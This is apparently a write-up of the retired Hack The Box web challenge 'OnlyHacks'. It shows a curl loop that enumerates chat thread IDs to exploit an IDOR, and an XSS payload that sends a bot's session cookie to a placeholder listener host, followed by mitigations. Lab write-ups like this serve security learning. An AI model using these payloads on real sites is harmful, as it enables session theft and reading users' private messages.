---
challenge: OnlyHacks
category: Web
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [web, idor, xss, flask, bot]
type: Web
---

# OnlyHacks — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Analysis notes; the flag is not published.

## Brief

A social network for "hackers" with open registration. The goal is the flag, and the hint lies in the private messaging between users.

## Recon

```bash
gobuster dir -u http://<IP>:<PORT>/ -w /usr/share/wordlists/dirb/common.txt
```

Typical routes for this challenge: `/register`, `/login`, `/dashboard`, `/profile`, `/chat`, `/report`. The app is **Flask** with a signed-cookie session.

## Main path: IDOR in the chat

The thread identifier travels in the URL:

```text
/chat?rid=2      -> your own conversation
/chat?rid=3      -> someone else's conversation
```

Changing `rid` by hand returns the other thread without an ownership check: plain **IDOR**. The flag sits inside user `Dimitris`'s conversation, in the clear, with nothing else to exploit.

```bash
for i in $(seq 1 10); do
  curl -s -b "session=<cookie>" "http://<IP>:<PORT>/chat?rid=$i" | grep -o "HTB{[^}]*}"
done
```

> Order matters: the IDOR is the documented path. The old writeup offered it as an alternative to the XSS and got the weight of the two backwards.

## Alternative path: XSS against the bot

The challenge ships a "report profile" button that a bot named **Renata** visits. If the profile reflects the field unescaped, the XSS runs in the bot's browser; the goal would be exfiltrating its session cookie to a listener of your own.

```html
<script>new Image().src="http://<LHOST>:8000/?c="+document.cookie</script>
```

```bash
python3 -m http.server 8000
```

It works as a secondary route but is more fragile: it depends on the bot visiting the profile and on the cookie policy. This challenge does not require it.

## Findings

- **IDOR** through a numeric parameter: the flaw is not checking that the thread belongs to the session user.
- The XSS against the bot is a real but incidental path here.
- Private messaging is a classic target: it concentrates information the rest of the app never shows.

## Lessons

- Enumerating sequential identifiers is the first access-control test.
- A `?rid=` accepting any integer is an open door.
- Mitigation: per-object authorisation on the server, unpredictable IDs, and output escaping plus CSP against XSS.
